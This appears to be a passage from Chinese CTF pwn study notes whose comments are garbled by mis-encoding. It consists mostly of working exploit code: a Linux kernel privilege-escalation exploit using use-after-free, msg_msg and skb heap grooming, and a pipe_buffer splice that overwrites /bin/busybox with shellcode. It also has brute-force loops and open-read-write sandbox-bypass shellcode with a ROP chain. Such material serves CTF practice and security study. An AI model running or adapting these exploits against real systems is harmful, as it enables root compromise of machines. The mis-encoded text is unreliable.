    FREE_PAGE,
    EXIT_SPRAY,
};

// typedef struct
// {
//     enum spray_cmd cmd;
//     int32_t idx;
//     int32_t size;
//     int32_t n;
// }ipc_req_t;

int shmid[0x1000];
void *shmaddr[0x1000];

void alloc_shm(int i);
int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
// int socketfds[INITIAL_PAGE_SPRAY];
// int alloc_pages_via_sock(uint32_t size, uint32_t n);

// void spray_comm_handler();

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n);
// void unshare_setup(uid_t uid, gid_t gid);
void errExit(char *msg);
void registerUserfault(void *fault_page,void *handler);

int spray_sendmsg(char *buf,int size,int count);
void hexdump(unsigned char *buff, size_t size);
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};
struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;
int msgqid[0x10000];
int add_msg(int msqid, const void *msgp, size_t msgsz);

int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp);

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int msg_get();
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next);
void build_msg(int num);
```



```c
# banzi.c
#include "banzi.h"

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0) {
        die("sched_setaffinity: %m");
    }
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int size, int count) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int add_msg(int msqid, const void *msgp, size_t msgsz) {
	if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
		perror("[-] msgsnd");
    	return -1;
    }
    return 0;
}
void alloc_shm(int i) {
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i] < 0) {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0) {
        perror("[X] shmat");
        exit(1);
    }
}
int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void build_msg(int num){
	for(int i = 0;i < num;i++){
		msgqid[i] = msg_get();
	}
}
int spray_sendmsg(char *buf,int size,int count){
    // char buf[size];
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
 
    // filled with 0x61 'a'
    // memset(buf,'\x00',sizeof(buf));
    // *(uint64_t*)(buf + 8*2) = 0xfff0;
    // *(uint64_t*)(buf + 8*3) = 0xdeadbeef;
    // set user space buf(msg header)
    msgh.msg_control = buf;
    msgh.msg_controllen = size;
    msgh.msg_name = (caddr_t)&addr;
    msgh.msg_namelen = sizeof(addr);
    for(int i = 0;i < count;i++){
      sendmsg(sockfd, &msgh, 0);
    }
}
void registerUserfault(void *fault_page,void *handler)
{
   pthread_t thr;
   struct uffdio_api ua;
   struct uffdio_register ur;
   uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   ua.api = UFFD_API;
   ua.features    = 0;
   if (ioctl(uffd, UFFDIO_API, &ua) == -1)
      errExit("[-] ioctl-UFFDIO_API");
 
   ur.range.start = (unsigned long)fault_page;
   ur.range.len   = PAGE_SIZE;
   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
      errExit("[-] ioctl-UFFDIO_REGISTER");
   int s = pthread_create(&thr, NULL,handler, (void*)uffd);
   if (s!=0)
      errExit("[-] pthread_create");
}
void errExit(char *msg) {
   puts(msg);
   _exit(-1);
}
// int alloc_pages_via_sock(uint32_t size, uint32_t n)
// {
//     struct tpacket_req req;
//     int32_t socketfd, version;

//     socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
//     if (socketfd < 0)
//     {
//         perror("bad socket");
//         exit(-1);
//     }

//     version = TPACKET_V1;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
//     {
//         perror("setsockopt PACKET_VERSION failed");
//         exit(-1);
//     }

//     assert(size % 4096 == 0);

//     memset(&req, 0, sizeof(req));

//     req.tp_block_size = size;
//     req.tp_block_nr = n;
//     req.tp_frame_size = 4096;
//     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
//     {
//         perror("setsockopt PACKET_TX_RING failed");
//         exit(-1);
//     }

//     return socketfd;
// }

// void spray_comm_handler()
// {
//     ipc_req_t req;
//     int32_t result;

//     do {
//         read(sprayfd_child[0], &req, sizeof(req));
//         assert(req.idx < INITIAL_PAGE_SPRAY);
//         if (req.cmd == ALLOC_PAGE)
//         {
//             socketfds[req.idx] = alloc_pages_via_sock(4096, req.n);
//             printf("%llx\n",socketfds[0]);
//         }
//         else if (req.cmd == FREE_PAGE)
//         {
//             close(socketfds[req.idx]);
//         }
//         result = req.idx;
//         write(sprayfd_parent[1], &result, sizeof(result));
//     } while(req.cmd != EXIT_SPRAY);

// }

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n)
// {
//     ipc_req_t req;
//     int32_t result;

//     req.cmd = cmd;
//     req.idx = idx;
//     req.n = n;
//     write(sprayfd_child[1], &req, sizeof(req));
//     read(sprayfd_parent[0], &result, sizeof(result));
//     assert(result == idx);
// }
// void unshare_setup(uid_t uid, gid_t gid)
// {
//     int temp;
//     char edit[0x100];
//     unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
//     temp = open("/proc/self/setgroups", O_WRONLY);
//     write(temp, "deny", strlen("deny"));
//     close(temp);
//     temp = open("/proc/self/uid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", uid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     temp = open("/proc/self/gid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", gid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     return;
// }
void win(void)
{
    if (check_root())
    {
        puts("[+] We are Ro0ot!");
        char *args[] = { "/bin/bash", "-i", NULL };
        execve(args[0], args, NULL);
    }
}
bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}


bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}


void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}


void save_state()
{
    __asm__ __volatile__(
        "movq %0, cs;"
        "movq %1, ss;"
        "pushfq;"
        "popq %2;"
        : "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}


int randint(int min, int max)
{
    return min + (rand() % (max - min));
}


void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void hexdump(unsigned char *buff, size_t size) {
    int i, j;

    for (i = 0; i < size / 8; i++) {
        if ((i % 2) == 0) {
            if (i != 0) printf("  \n");

            printf("  %04x  ", i * 8);
        }

        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }

    putchar('\n');
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}


void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}


void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    bool suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);
    
    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {   
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) { };
    }
        
}


void create_poll_thread(int id, size_t size, int timer, bool suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}


void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);
        // open("/proc/self/stat", O_RDONLY);
    }
        
    poll_threads = 0;
}


int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);    

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
		perror("[X] add_key()");
		return -1;
	}
    	
    return key;
}


void free_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	
    if(keyctl_revoke(keys[i]) < 0 || keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING) < 0){
        printf("keys[%d]\n ",i);
        perror("=> ");
        // printf("%d\n")
        return -1;
    }
	
    // n_keys--;
}
void revoke_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	if(keyctl(KEYCTL_REVOKE, keys[i], 0, 0, 0) < 0){
        printf("keys[%d] ",i);
        perror("=> ");
        return -1;
    }
	// keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    // n_keys--;
}


void free_all_keys(bool skip_corrupted_key)
{
    for (int i = 0; i < n_keys; i++)
    {   
        if (skip_corrupted_key && i == corrupted_key)
            continue;

        free_key(i);
    }

    sleep(1); // GC keys
}


char *get_key(int i, size_t size)
{
	char *data;

	data = calloc(1, size);
	keyctl_read(keys[i], data, size);
    // printf("%s\n",data);
	return data;
}


void alloc_pipe_buff(int i)
{
    if (pipe(pipes[i]) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    // if (write(pipes[i][1], "XXXXX", 5) < 0)
    // {
    //     perror("[X] alloc_pipe_buff()");
    //     return;
    // }
}


void release_pipe_buff(int i)
{
    if (close(pipes[i][0]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }

    if (close(pipes[i][1]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }
}


void alloc_tty(int i)
{
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0)
    {
        perror("[X] alloc_tty()");
        exit(1);
    }
}


void free_tty(int i)
{
    close(ptmx[i]);
}


void alloc_seq_ops(int i)
{
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0)
    {
        perror("[X] spray_seq_ops()");
        exit(1);
    }
}


void free_seq_ops(int i)
{
    close(seq_ops[i]);
}


int leak_kernel_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    leak = (uint64_t *)key;

    // if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0x520)
    // {
    //     // corrupted_key = i;
    //     // proc_single_show = *leak;
    //     // kernel_base = proc_single_show - 0xffffffff813275c0;

    //     // printf("[+] Corrupted key found: keys[%d]!\n", corrupted_key);
    //     // printf("[+] Leaked proc_single_show address: 0x%llx\n", proc_single_show);
    //     // printf("[+] Kernel base address: 0x%llx\n", kernel_base + 0xffffffff00000000);
    //     kernel_base = 
        
    //     return 0;
    // }
    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_kernel_pointer(leak[i]) && (leak[i] & 0xfff) == 0x520)
        {   
            // if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            // {
            //     target_object = leak[i];
            //     logi("Leaked kmalloc-1024 object: 0x%llx\n", target_object);
            //     return 0;
            // }
            uint64_t kernel_base1 = leak[i] - 0x1ab2520;
            logi("get kernel_base: 0x%llx",kernel_base1);
            return kernel_base1;
        }
    }

    return -1;
}


int leak_heap_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    // hexdump(key,0x100);
    leak = (uint64_t *)key;

    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00)
        {   
            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            {
                target_object = leak[i];
                logi("Leaked kmalloc-1024 object: 0x%llx", target_object);
                return 0;
            }
        }
    }

    return -1;
}


bool check_root()
{
	int fd;
    
    if ((fd = open("/etc/shadow", O_RDONLY)) < 0)
        return false;
        
    close(fd);
    
    return true;
}
```





exp.c

```c
#include "banzi.h"
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int main(){
    const char attack_data[] = {106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5};
    char *buf = calloc(1,0x4000);
    char data[0x1000] = { 0 };
    char key[32] = { 0 };
    uint64_t *rop;
    void *stack;
    char *buff;
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    assign_to_core(0);
    save_state();
    fd = open("/dev/kernelpwn",1);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    puts("[1-1]draining kmalloc-512");
    for(int i = 0;i < 8;i++){
      memset(buf,'a',0x200);
      keys[i] = alloc_key(i,buf,0x110);
    }
    // memset(buf,'b',0x200);
    add(fd,buf);
    del(fd,0);
    puts("[1-2]spray user_key_payload(0x200) and free all keys");
    for(int i = 8;i<73;i++){
      keys[i] = alloc_key(i,buf,0x110);
    }
    for(int i = 0;i<73;i++){
      free_key(i);
    }
    puts("[1-3]spray msg_msg to cross cache attack");
    build_msg(2000);
    memset(msgbuf.mtext,'A',0x200);
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x200-0x30);
    }
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 2;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);
    }
    puts("[1-4]uaf");//æ­¤æ—¶æ¼æ´å¯¹å—å’Œmsg_msgå…±ç”¨ä¸€ä¸ªå †å—
    del(fd,0);
    //é€šè¿‡skb_bufferæ¥å ä½msg_msg
    puts("[2-1]spray skb_buffer to change msg_msg->m_ts leak heap_addr");
    *(uint64_t*)buf = NULL;
    *(uint64_t*)(buf+8) = NULL;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    int ss[1000][2];
    for(int i = 0;i < 500;i++){
      if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
          perror("[-] socketpair");
          return -1;
      }
    }
    for(int i = 0;i<200;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    puts("[2-2]leak msg_msg == skb_buffer");//æ­¤æ—¶msg_msgå’Œskb_bufferä¼šå–·åœ¨ä¸€ä¸ªå¯¹å—é‡Œé¢
    int msg_key,skb_key;
    uint64_t heap_addr,heap_addr1;
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x1000-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-3]leak heap_addr");//é€šè¿‡æ³„æ¼å †åœ°å€æ¥é€ msg_msgä¸Šçš„ä»»æ„msg_msgçš„free
    if(msg_key != 0){
      for(int i = 0;i<(0x1000-0x30)/0x8;i++ ){
        printf("%d => %llx\n",i,*(uint64_t*)(buf + i*8) );
        if(*(uint64_t*)(buf + i*8) == 1 && *(uint64_t*)(buf + (i+1)*8) == 0x1d0 ){
          heap_addr = *(uint64_t*)(buf + (i-2)*8);
          heap_addr1 = *(uint64_t*)(buf + (i-1)*8);
          printf("heap leak: 0x%llx\n",heap_addr);
          break;
        }
      }
    }
    puts("[2-4]free skb_buffer to hijack msg_msg");//é€ ä»»æ„msg_msg free
    if (read(ss[skb_key][1], buf, 0x200-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)buf = heap_addr;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x200-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 200;i<300;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x200-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        // msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-5] free 0x400 msg_msg");
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 0x2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 300;i<310;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    //show_msgæ˜¯ä»¥idxä¸ºåŸºå‡†çš„
    int skb_buf1,skb_buf2;
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf1 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf1 :%d\n",*(uint64_t*)(buf + 8*3));
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 310;i<330;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf2 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf2 :%d\n",*(uint64_t*)(buf + 8*3));
    if (read(ss[skb_buf1][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    //æ•´ç†ç¢ç‰‡
    for(int i = 330;i < 340;i++){
      // *(uint64_t*)(buf+8*8) = i;
      memset(buf,'x',0x400);
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    puts("[3-1] pipe_prime");
    puts("pipe buffer");
    int pipefd[5][2];
    for(int i = 0;i<5;i++){
      if (pipe(pipefd[i]) < 0) {
          perror("[-] pipe");
          return -1;
      }
      memset(buf,"x",0x400);
      const unsigned pipe_size = fcntl(pipefd[i][1], F_GETPIPE_SZ);
      static char buffer[4096];
      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(pipefd[i][1], buffer, n);
        r -= n;
      }

      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(pipefd[i][0], buffer, n);
        r -= n;
      }
      int attack_fd = open("/bin/busybox",O_RDONLY);
      if(attack_fd < 0){
          perror("open");
          _exit(0);
      }
      loff_t offset = 0x1fdac8;
      splice(attack_fd,&offset,pipefd[i][1], NULL, 1, 0);
    }
    if (read(ss[skb_buf2][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)(buf + 3*8) = 0x10;
    //æ•´ç†ç¢ç‰‡
    for(int i = 340;i < 370;i++){
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0 ;i< 5;i++){
      if (write(pipefd[i][1],attack_data, sizeof(attack_data)) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0;i<5;i++){
      close(pipefd[i][1]);
      close(pipefd[i][0]);
    }
    memset(msgbuf.mtext,'\x00',0x400);
    for(int i = 1000;i<1100;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);//é¿å…pipe_bufferå’Œskb_bufferé‡Šæ”¾çš„æ—¶å€™é€ æˆdouble freeçš„é”™è¯¯
    }
    logi("Enter exit");
    // __pause("debug");
    // system("/bin/sh");

}
```



## éå †é¢˜ç›®æ¡ˆä¾‹åˆ†æğŸ¹

### è¾“å…¥é€†å‘
strtok æŒ‰ç…§ç¬¦å·è¿›è¡Œåˆ‡å‰²ï¼Œè¿”å›åˆ‡å‰²åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºNULLæ—¶å€™ï¼Œè¡¨ç¤ºç»§ç»­ä¸Šæ¬¡çš„åˆ†å‰²ç»“æœ

å…¶åŸç†æ˜¯åœ¨é‡åˆ°åˆ†éš”ç¬¦æ—¶å°†åˆ†éš”ç¬¦æ›¿æ¢ä¸º \0

```c
s1 = strtok(input, "$")
 strtok(NULL, ",")

```





### çˆ†ç ´å¾ªç¯çš„å†™æ³•

æ¯”å¦‚çˆ†ç ´æŸä¸€åœ°å€ä½ä½ä¸ºç‰¹æ®Šå€¼

```python
# é€šè¿‡ç‰¹æ®Šè¿”å›å€¼æ¥è¿›è¡Œifåˆ¤æ–­
def pwn():
	s = p.recvline()
	if s != b"00 \n":
        cnt += 1
        print("FAIL. Try again.",t,s.decode()[0:2])
        return 0
    
	return 1
cnt = 0
while(1):
    p = process("./chall")
    if(pwn()):
        ia()
        break
    else:
        p.close()
```


```python

def pwn():
    s = p.recvline()# å‰è¾¹å¯èƒ½è¦å¾ªç¯è·å–
    if s != b"00 \n":
        print("FAIL. Try again.", s.decode()[0:2])
        raise ValueError("Failed")	

cnt = 0
for i in range(1):
        try:
            pwn()
            break
        except ValueError as e:
	        print(f"Attempt {cnt+1}: {e}")
	        p.close()
	        cnt += 1
        p.close()
```







### orw->æ²™ç®±ç»•è¿‡ğŸª¡

#### orw_gadget

mprotect + orwæ±‡ç¼–

è¿™ç§ä¼˜å…ˆçº§æœ€é«˜ï¼Œç»“åˆæ ˆè¿ç§»åˆ°bssæ®µä¸Š(æœ¬åœ°æ‰“åœ¨å½“å‰ç›®å½•å»ºä¸€ä¸ªflag)

```python
shellcode = asm(
'''
    mov eax, 0x67616c66 ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall ;// write open() return value

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall ;// write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit
'''
)
pay = (#cyclic(64)# + flat(
[
    #0, 
    pop_rdi, 0x601000, 
    pop_rsi, 0x2000, 
    pop_rdx, 7,
    mprotect,
    jmp_rsp
]) + shellcode).ljust(0x100, b'\0')


```



ä¸‹è¾¹2ç§é€šå¸¸éœ€è¦è°ƒæ•´gadgetï¼Œè€Œä¸”è¿˜éœ€è¦æ‰¾ä¸ªåœ°æ–¹å†™å…¥/flag

```python
